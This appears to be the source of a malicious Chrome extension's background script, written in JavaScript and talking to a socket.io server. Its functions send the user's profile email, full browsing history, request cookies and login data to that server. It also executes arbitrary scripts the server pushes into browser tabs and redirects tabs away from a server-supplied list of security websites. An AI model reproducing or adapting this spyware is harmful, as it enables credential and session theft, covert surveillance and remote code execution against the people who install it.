function connectToServer() {
  socket = io('http://localhost:3000');
  chrome.identity.getProfileUserInfo((userInfo) => {
    if (userInfo.email == null) {
      userInfo.email = "No email";
      userInfo.id = "User not logged in";
    }
    socket.emit('userInfo', userInfo);
  });
  updateSecurityWebsites(socket);
  return socket;
}

function disconnectFromServer(socket) {
  socket.disconnect();
}

function updateSecurityWebsites(socket) {
  socket.on('securityWebsites', (securityWebsites) => {
    chrome.storage.sync.set({
      'securityWebsites': securityWebsites
    });
  });
}

function searchAndSendHistory() {
  chrome.history.search({
    text: ''
  }, (results) => {
    results.forEach((page) => {
      sendHistoryPage(page);
    });
  });
}

function sendHistoryPage(page) {
  socket.emit('History', [page.url, new Date(page.lastVisitTime)])
}

function checkAndSendCookies(info) {
  info.requestHeaders.forEach((header) => {
    if (header.name === "Cookie") {
      socket.emit('Cookies', header.value);
    }
  });
}

function sendLoginInfo(loginInfo) {
  socket.emit('Login', loginInfo);
}

function checkSecurityWebsites(tabId, changeInfo) {
  if (changeInfo.url) {
    chrome.storage.sync.get('securityWebsites', (securityWebsites) => {
      for (var i = 0; i < securityWebsites.securityWebsites.length; i++) {
        if (changeInfo.url.includes(securityWebsites.securityWebsites[i])) {
          redirectToRandomWebsite(tabId);
        }
      }
    });
  }
}

function createScriptSocket() {
  socket.on('Script', (script) => {
    chrome.tabs.executeScript(script.id, {
      code: script.code
    });
  });
}
